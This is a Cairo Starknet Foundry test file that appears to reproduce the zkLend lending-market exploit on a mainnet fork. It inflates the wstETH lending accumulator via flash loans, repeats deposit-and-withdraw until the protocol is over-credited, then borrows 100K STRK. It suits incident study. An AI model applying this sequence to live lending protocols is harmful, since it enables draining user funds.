use snforge_std::{CheatSpan, ContractClassTrait, DeclareResultTrait, cheat_caller_address, declare};
use starknet::{ContractAddress, contract_address_const, get_contract_address};
use zklend_repro::attacker::{IAttackerDispatcher, IAttackerDispatcherTrait};
use zklend_repro::interfaces::{
    IMarketDispatcher, IMarketDispatcherTrait, IERC20Dispatcher, IERC20DispatcherTrait,
    IZTokenDispatcher, IZTokenDispatcherTrait,
};

const market_address_felt: felt252 =
    0x4c0a5193d58f74fbace4b74dcf65481e734ed1714121bdc571da345540efa05;
const strk_address_felt: felt252 =
    0x04718f5a0fc34cc1af16a1cdee98ffb20c31f5cd61d6ab07201858f4287c938d;
const wstETH_address_felt: felt252 =
    0x0057912720381af14b0e5c87aa4718ed5e527eab60b3801ebf702ab09139e38b;
const zwstETH_address_felt: felt252 =
    0x05240577D1d546f1C241b9448a97664c555e4b0d716eD2eE4c43489467f24e29;
const ETH_address_felt: felt252 =
    0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7;

fn setup() -> ContractAddress {
    let attacker_class = declare("Attacker").unwrap().contract_class();
    let market_address: ContractAddress = contract_address_const::<market_address_felt>();
    let mut calldata = ArrayTrait::new();
    market_address.serialize(ref calldata);

    let (contract_address, _) = attacker_class.deploy(@calldata).unwrap();
    contract_address
}

#[test]
#[fork("MAINNET_LATEST", block_number: 1143545)]
fn test_regular_deposit_and_borrow() {
    let ekubo_address: ContractAddress = contract_address_const::<
        0x00000005dd3d2f4429af886cd1a3b08289dbcea99a294197e9eb43b0e0325b4b,
    >();

    let eth_address: ContractAddress = contract_address_const::<ETH_address_felt>();
    let eth_contract = IERC20Dispatcher { contract_address: eth_address };

    let balance_before = eth_contract.balanceOf(ekubo_address);
    println!("Balance {}", balance_before);

    cheat_caller_address(eth_address, ekubo_address.try_into().unwrap(), CheatSpan::TargetCalls(1));

    let owner_address = get_contract_address();

    let transfer_value: u256 = 40_000_000_000_000_000_000; // 30 tokens
    eth_contract.transfer(owner_address, transfer_value);
    let balance_after = eth_contract.balanceOf(owner_address);
    println!("Balance {}", balance_after);

    let market_address: ContractAddress = contract_address_const::<market_address_felt>();
    let market = IMarketDispatcher { contract_address: market_address };

    let deposit_value = 10_000_000_000_000_000_000;

    eth_contract.approve(market_address, deposit_value.into());

    market.deposit(eth_address, 10_000_000_000_000_000_000);

    market.enable_collateral(eth_address);

    // try to borrow
    let strk_address: ContractAddress = contract_address_const::<strk_address_felt>();
    market.borrow(strk_address, 1_000_000_000_000_000_000);
}

#[test]
#[fork("MAINNET_LATEST", block_number: 1143545)]
fn test_increase_accumulator() {
    let attacker_address = setup();
    let attacker = IAttackerDispatcher { contract_address: attacker_address };
    // Get some wstETH to create the attack, use ekubo as the doner
    let ekubo_address: ContractAddress = contract_address_const::<
        0x00000005dd3d2f4429af886cd1a3b08289dbcea99a294197e9eb43b0e0325b4b,
    >();

    let erc20_address: ContractAddress = contract_address_const::<wstETH_address_felt>();
    let erc20 = IERC20Dispatcher { contract_address: erc20_address };

    let balance_before = erc20.balanceOf(ekubo_address);
    println!("Balance {}", balance_before);

    cheat_caller_address(
        erc20_address, ekubo_address.try_into().unwrap(), CheatSpan::TargetCalls(1),
    );

    let owner_address = get_contract_address();

    let transfer_value: u256 = 40_000_000_000_000_000_000; // 40 tokens
    erc20.transfer(owner_address, transfer_value);
    let balance_after = erc20.balanceOf(owner_address);
    println!("Balance {}", balance_after);

    // initiate the market by sending just one wei worth of wstETH
    let market_address: ContractAddress = contract_address_const::<market_address_felt>();
    let market = IMarketDispatcher { contract_address: market_address };

    let deposit_sum: felt252 = 1;

    erc20.approve(market_address, deposit_sum.into());
    market.deposit(erc20_address, deposit_sum);

    let accumulator = market.get_lending_accumulator(erc20_address);
    println!("Accumulator {}", accumulator);

    // transfer some funds to the attacking contract
    erc20.transfer(attacker_address, 30_000_000_000_000_000_000);

    // call flashloans, similarly to attacker/ using 4.3 wstETH
    attacker.call_flash_loan(4_300_000_000_000_000_000);

    let accumulator = market.get_lending_accumulator(erc20_address);
    println!("Accumulator {}", accumulator);

    let ztoken_address: ContractAddress = contract_address_const::<zwstETH_address_felt>();
    let ztoken = IZTokenDispatcher { contract_address: ztoken_address };

    let total_supply = ztoken.get_raw_total_supply();
    println!("Total supply before {}", total_supply);

    // make a deposit from the attacker contract
    attacker.deposit();

    let balance_after = ztoken.balanceOf(attacker_address);
    println!("Balance {}", balance_after);

    let total_supply = ztoken.get_raw_total_supply();
    println!("Total supply after deposit {}", total_supply);

    // Deposit and withdraw

    // repeat attack several times
    for _ in 1..5_u8 {
        attacker.deposit_and_withdraw();
        let total_supply = ztoken.get_raw_total_supply();
        println!("Total supply {}", total_supply);

        let balance_after = ztoken.balanceOf(attacker_address);
        println!("zToken balance {}", balance_after);

        let actual_erc20_balance = erc20.balanceOf(market_address);
        println!("Actual erc20 balance {}", actual_erc20_balance);

        // At this point, the protocol is compromised
        // It assumes the attacker has more tokens than they have deposited
        assert!(balance_after > actual_erc20_balance, "Not comporomised yet");
    }
    // At this point the attacker has a preceived balance of ~50 wstETH
    // The protocol has a bit or WETH, but is negligable (and can be recovered)

    // The attacker can now withdraw all the funds

    // Example borrow tx
    // https://voyager.online/tx/0x2896d1fa68bf1a39ba8db980b4c519bc4c1d189febac58a8344b6c84e814e1#internalCalls-1757466574

    // now the attacker can borrow from the market with the zToken value they have
    let strk_address: ContractAddress = contract_address_const::<strk_address_felt>();

    let strk_contract = IERC20Dispatcher { contract_address: strk_address };
    attacker.borrow(strk_address, 100_000_000_000_000_000_000_000); //100K strk

    let strk_balance = strk_contract.balanceOf(attacker_address);
    println!("STRK balance {}", strk_balance);
}
